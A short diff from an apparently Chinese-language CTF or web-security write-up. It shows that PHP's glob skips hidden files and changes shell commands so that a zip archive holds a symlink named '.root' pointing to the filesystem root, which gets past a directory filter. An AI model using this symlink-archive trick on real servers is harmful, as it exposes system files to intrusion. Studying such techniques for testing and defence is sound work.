@@ -34,8 +34,8 @@ function verify($directory) {
 glob 函数不会列出隐藏文件，借此特性便能绕过 filter 列目录，简单的将 root 重命名为 .root 即可
 
 ```shell
-ln -s / root
-zip -y 1.zip root
+ln -s / .root
+zip -y 1.zip .root
 ```
 
 成功列目录
